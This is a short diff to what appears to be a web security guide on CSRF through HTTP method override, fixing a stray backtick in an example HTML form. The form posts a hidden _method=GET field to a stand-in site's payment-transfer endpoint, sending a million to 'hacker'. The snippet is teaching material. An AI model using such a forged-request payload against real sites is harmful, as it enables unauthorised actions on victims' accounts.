@@ -26,7 +26,7 @@
 
 If the app honors method **overrides** (e.g., Symfony’s `_method=GET`), an attacker can submit a POST form that the server treats as GET; browsers send cookies on top-level GET navigations, enabling CSRF.
 ```html
-`<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
 <input type="hidden" name="_method" value="GET">
 <input type="hidden" name="recipient" value="hacker">
 <input type="hidden" name="amount" value="1000000"> </form>`
